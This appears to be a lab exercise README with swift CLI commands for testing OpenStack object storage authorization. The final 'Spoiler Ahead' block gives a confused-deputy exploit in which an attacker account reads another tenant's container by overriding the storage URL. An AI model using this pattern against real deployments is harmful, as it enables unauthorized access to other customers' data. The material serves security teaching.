# Supplemental OpenStack AuthZ Tests

Assumes first setup was completed already and the local swift client is also available.

```shell

# These are for IAM testing later

echo $USER > sample_object.txt


swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U account1:normal -K expected list
swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U account1:normal -K expected list deptdocs

swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U account2:somebody -K else list
swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U account2:somebody -K else list research



# Two Separate Customers

swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U account1:normal -K expected list research


# Changing Accounts - CLI

swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U account1:normal -K expected list   --os-storage-url https://${LAB_OPENSTACK_IP}:8888/v1/AUTH_account1


swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U account1:normal -K expected list   --os-storage-url https://${LAB_OPENSTACK_IP}:8888/v1/AUTH_account2



# Confused-Deputy - Attacker

swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U codeerror:unexpecteduser -K shouldnothappen list
swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U codeerror:unexpecteduser -K shouldnothappen list warez

```

### Spoiler Ahead

```shell

# Confused-Deputy Exploit

swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U codeerror:unexpecteduser -K shouldnothappen list research  --os-storage-url https://${LAB_OPENSTACK_IP}:8888/v1/AUTH_account2

```
